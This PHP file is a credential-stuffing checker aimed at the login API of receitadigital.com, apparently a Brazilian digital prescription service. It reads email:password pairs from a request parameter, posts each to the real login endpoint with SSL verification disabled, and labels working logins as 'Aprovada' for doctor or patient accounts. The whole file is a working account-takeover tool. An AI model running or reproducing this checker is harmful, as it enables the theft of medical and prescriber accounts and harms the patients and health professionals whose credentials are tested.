<?php
error_reporting(1);
set_time_limit(0);
date_default_timezone_set('America/Sao_Paulo');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function multiexplode($delimiters, $string) 
{
    $delim = implode('|', array_map('preg_quote', $delimiters));
    return preg_split("/($delim)/", $string);
}

function puxar($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

extract($_GET);
$del = array("|", ":");
$lista = $_GET['lista'];
$email = multiexplode($del, $lista)[0];
$senha = multiexplode($del, $lista)[1];

$inicio = microtime(true);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.receitadigital.com/api/user/login');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br, zstd");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: application/json, text/plain, */*',
    'Sec-Ch-Ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'Sec-Ch-Ua-Mobile: ?0',
    'Sec-Ch-Ua-Platform: "Windows"',
    'Content-Type: application/json',
    'Referer: https://app.receitadigital.com/'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.'","password":"'.$senha.'"}');
$receitadigital = curl_exec($ch);
$fim = microtime(true);
$total = $fim - $inicio;
$segs = number_format($total, 2);

if(strpos($receitadigital, 'healthProfessional') !== false) {
    echo '<span class="badge badge-success">✅ #Aprovada </span> <font color="white"> » ['.$email.' / '.$senha.'] » <span class="badge badge-success">[Login Encontrado - Doutor] </span > » ('.$segs.'s) #Lean7</span><br>';
}elseif(strpos($receitadigital, "patient") !== false) {
    echo '<span class="badge badge-success">✅ #Aprovada </span> <font color="white"> » ['.$email.' / '.$senha.'] » <span class="badge badge-success">[Login Encontrado - Paciente] </span > » ('.$segs.'s) #Lean7</span><br>';
}else{
    echo '<span class="badge badge-danger">🧨 #Reprovada </span> <font color="white"> » ['.$email.' / '.$senha.'] » <span class="badge badge-danger">[Email ou senha invalida.] </span> » ('.$segs.'s) #Lean7</span><br>';
}

?>